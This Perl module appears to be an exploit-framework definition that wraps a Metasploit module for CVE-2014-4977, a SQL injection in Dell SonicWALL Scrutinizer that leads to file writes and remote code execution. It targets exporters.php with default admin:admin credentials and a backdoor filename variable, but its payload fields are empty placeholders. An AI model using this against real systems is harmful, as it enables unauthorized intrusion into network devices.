package SONICWALL::MSF::SonicwallScrutinizerMethoddetailSqli;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "SonicwallScrutinizerMethoddetailSqli";

   my $DETECTION = {

   };

my $EXPLOIT = {
  "CVE" => "CVE-2014-4977",
  "DESCRIPTION" => "

        This module exploits a vulnerability found in Dell SonicWALL Scrutinizer. The methodDetail

        parameter in exporters.php allows an attacker to write arbitrary files to the file system

        with an SQL Injection attack, and gain remote code execution under the context of SYSTEM

        for Windows, or as Apache for Linux.



        Authentication is required to exploit this vulnerability, but this module uses

        the default admin:admin credential.

      ",
  "METHOD" => "POST",
  "MSF_MODULE" => "sonicwall_scrutinizer_methoddetail_sqli",
  "PATH" => "methodDetail=__METHODDETAIL__&",
  "PATHS" => ["cgi-bin/login.cgi", "d4d/exporters.php"],
  "PAYLOAD" => "?",
  "REFERENCES" => [
    "http://seclists.org/fulldisclosure/2014/Jul/44",
    "https://gist.github.com/brandonprry/76741d9a0d4f518fe297",
  ],
  "THE USERTITLE TO AUTHENTICATE AS" => "admin",
  VARIABLES => {
    'USERNAME' =>       { DESCRIPTION => "", VALUE => "" },
    'SID' =>       { DESCRIPTION => "", VALUE => "" },
    'UID' =>       { DESCRIPTION => "", VALUE => "" },
    'PWD' =>       { DESCRIPTION => "", VALUE => "" },
    'BACKDOOR_FNAME' =>       { DESCRIPTION => "", VALUE => "" },
    'METHODDETAIL' =>       { DESCRIPTION => "", VALUE => "" },
    'PASSWORD' =>       {
  DESCRIPTION => "The password to authenticate with",
  VALUE => "admin",
},
    'NAME' =>       { DESCRIPTION => "", VALUE => "" },
  },

  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'Cookie' => 'cookiesenabled=1;sessionid=;userid=',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
